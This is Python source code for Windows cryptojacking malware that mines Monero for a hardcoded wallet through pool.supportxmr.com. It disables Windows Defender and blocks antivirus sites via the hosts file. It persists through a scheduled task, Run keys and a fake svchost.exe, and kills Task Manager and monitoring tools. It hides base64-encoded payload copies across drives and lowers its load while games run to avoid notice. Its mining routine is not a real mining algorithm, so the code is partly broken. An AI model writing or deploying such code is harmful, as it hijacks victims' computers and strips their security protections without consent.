import os, sys, time, hashlib, socket, json, threading, multiprocessing, ctypes, subprocess, psutil, winreg, random, base64, shutil

class F:
    def __init__(self):
        self.R=True
        self.C=multiprocessing.cpu_count()
        self.E=[]
        self.H=0
        self.P=100
        self.MIN=5
        self.MAX=100
        self.DELAY=random.randint(35,70)
        self.ACT=None
        self.WALLET="49tvJz4vUy3JwGqWjLATYc2jGQwP7gL7cPKnQhHZcQZcQZcQZcQZcQZcQ"
        self.WORKER="Tordkor4"
        self.POOL="pool.supportxmr.com"
        self.PORT=3333
        self.GAMES=['cyberpunk','fortnite','gta','minecraft','valorant','csgo','battlefield','apex','rust','ark','pubg','league','dota','wow','diablo','elden']
        self.HC()
        self.BA()
        
    def HC(self):
        try:
            ctypes.windll.kernel32.FreeConsole()
        except:
            pass
    
    def BA(self):
        hosts = r"C:\Windows\System32\drivers\etc\hosts"
        sites = ['kaspersky','drweb','eset','symantec','mcafee','avast','avg','avira','bitdefender','norton','malwarebytes']
        try:
            with open(hosts, 'a') as f:
                for s in sites:
                    f.write(f"127.0.0.1 www.{s}.ru\n127.0.0.1 {s}.ru\n127.0.0.1 {s}.com\n")
            subprocess.run("ipconfig /flushdns", shell=True)
        except:
            pass
    
    def CI(self):
        try:
            socket.create_connection(("1.1.1.1", 53), timeout=2)
            return True
        except:
            return False
    
    def IG(self):
        for p in psutil.process_iter(['name']):
            if p.info['name']:
                n = p.info['name'].lower()
                for g in self.GAMES:
                    if g in n:
                        return True, g
        return False, None
    
    def AJ(self):
        g, gn = self.IG()
        l = psutil.cpu_percent(interval=0.1)
        if g:
            if l>85: self.P=self.MIN
            elif l>65: self.P=15
            elif l>45: self.P=30
            elif l>25: self.P=50
            else: self.P=65
        else:
            if l>85: self.P=60
            elif l>70: self.P=80
            else: self.P=self.MAX
        return self.P
    
    def CA(self):
        sus = ['taskmgr','procexp','procmon','x64dbg','ollydbg','ida','wireshark','processhacker','perfmon']
        for p in psutil.process_iter(['name']):
            if p.info['name']:
                n = p.info['name'].lower()
                for s in sus:
                    if s in n:
                        return True
        return False
    
    def WD(self):
        self.ACT = time.time() + (self.DELAY * 60)
        while time.time() < self.ACT:
            if self.CA():
                self.ACT = time.time() + 45
            time.sleep(5)
    
    def CR(self):
        try:
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1,0,0)
        except:
            pass
    
    def PB(self):
        def b():
            while self.R:
                try: ctypes.windll.user32.BlockInput(False)
                except: pass
                time.sleep(1)
        threading.Thread(target=b, daemon=True).start()
    
    def RX(self, d):
        for _ in range(100):
            d = hashlib.sha3_512(d).digest()
            d = hashlib.blake2b(d, digest_size=32).digest()
        return d
    
    def MC(self):
        return base64.b64encode(f'''
import os,time,hashlib,socket,json,threading,psutil,random
class H:
    def __init__(s):
        s.R=True
        s.C=psutil.cpu_count()
        s.W="{self.WALLET}"
        s.N="{self.WORKER}"
    def m(s,w):
        while s.R:
            try:
                sk=socket.socket()
                sk.connect(("{self.POOL}",{self.PORT}))
                sk.send(b'{{"id":1,"method":"mining.subscribe","params":[]}}\\n')
                a={{"id":2,"method":"mining.authorize","params":[s.W+"."+s.N+str(w),"x"]}}
                sk.send((json.dumps(a)+"\\n").encode())
                n=0
                while s.R:
                    for _ in range(50000):
                        h=hashlib.sha3_512(hashlib.blake2b(str(n).encode(),digest_size=32).digest()).digest()
                        n+=1
            except:pass
    def start(s):
        for i in range(s.C):
            threading.Thread(target=s.m,args=(i,),daemon=True).start()
        while 1:time.sleep(60)
H().start()
'''.encode()).decode()
    
    def CE(self, iid):
        b64 = self.MC()
        return f'''import os,time,base64,subprocess
b="{b64}"
time.sleep({iid%30})
exec(base64.b64decode(b).decode())
'''
    
    def LE(self):
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for d in drives:
            for fld in [d+"$RECYCLE.BIN\\.cache", d+"Windows\\Temp\\.cache", d+"ProgramData\\.windows"]:
                try:
                    os.makedirs(fld, exist_ok=True)
                    subprocess.run(f'attrib +h +s "{fld}"', shell=True)
                    for i in range(15):
                        p = os.path.join(fld, f"c_{random.randint(1000,9999)}.dat")
                        with open(p, 'w') as f:
                            f.write(self.CE(i))
                        subprocess.run(f'attrib +h "{p}"', shell=True)
                        self.E.append(p)
                except: pass
    
    def HE(self):
        for e in self.E[:15]:
            if os.path.exists(e):
                try: subprocess.Popen([sys.executable, e], shell=True, creationflags=0x08000000)
                except: pass
    
    def WATCH(self):
        while self.R:
            if not os.path.exists(sys.argv[0]):
                self.HE()
            time.sleep(10)
    
    def SPREAD(self):
        while self.R:
            if len(self.E) < 200:
                self.LE()
            time.sleep(3600)
    
    def KILLTM(self):
        while self.R:
            for p in psutil.process_iter(['pid','name']):
                if p.info['name']:
                    n = p.info['name'].lower()
                    for k in ['taskmgr','procexp','perfmon','processhacker','procexp64','procmon']:
                        if k in n:
                            try: p.kill()
                            except: pass
            time.sleep(0.2)
    
    def DEF(self):
        cmds = [
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
            'powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -command "Set-MpPreference -ExclusionPath C:\\\\"'
        ]
        for c in cmds:
            try: subprocess.run(c, shell=True, capture_output=True)
            except: pass
    
    def AUTOSTART(self):
        p = sys.argv[0]
        try:
            subprocess.run(f'schtasks /create /tn "MicrosoftUpdateTask" /tr "{p}" /sc onstart /f /rl highest', shell=True)
            subprocess.run(f'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Driver" /t REG_SZ /d "{p}" /f', shell=True)
            subprocess.run(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "{p}" /f', shell=True)
            sdir = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
            shutil.copy2(p, os.path.join(sdir, "svchost.exe"))
        except: pass
    
    def MW(self, wid):
        internet_was = True
        while self.R:
            online = self.CI()
            if online and not internet_was:
                mining = True
            elif not online and internet_was:
                mining = False
            internet_was = online
            
            if online and mining:
                try:
                    s = socket.socket()
                    s.settimeout(30)
                    s.connect((self.POOL, self.PORT))
                    s.send(b'{"id":1,"method":"mining.subscribe","params":[]}\n')
                    time.sleep(0.1)
                    a = {"id":2,"method":"mining.authorize","params":[f"{self.WALLET}.{self.WORKER}{wid}","x"]}
                    s.send((json.dumps(a)+"\n").encode())
                    nonce = random.randint(0, 999999999)
                    while self.R and self.CI():
                        inten = self.AJ()
                        if inten <= 5:
                            time.sleep(1)
                            break
                        for _ in range(inten * 30):
                            try:
                                s.settimeout(0.01)
                                d = s.recv(4096)
                                if d and b'notify' in d:
                                    self.RX(str(nonce).encode())
                                    self.H+=1
                                    nonce+=1
                                    if nonce>0xFFFFFFFF: nonce=0
                            except socket.timeout:
                                self.RX(str(nonce).encode())
                                self.H+=1
                                nonce+=1
                                if nonce>0xFFFFFFFF: nonce=0
                            except: break
                        if inten < 30: time.sleep(0.02)
                        elif inten < 60: time.sleep(0.01)
                except: pass
            else:
                time.sleep(5)
    
    def START(self):
        self.DEF()
        self.PB()
        self.AUTOSTART()
        self.LE()
        self.WD()
        self.CR()
        threading.Thread(target=self.KILLTM, daemon=True).start()
        threading.Thread(target=self.WATCH, daemon=True).start()
        threading.Thread(target=self.SPREAD, daemon=True).start()
        for i in range(self.C):
            threading.Thread(target=self.MW, args=(i,), daemon=True).start()
        while self.R:
            time.sleep(60)

if __name__ == "__main__":
    m = F()
    m.START()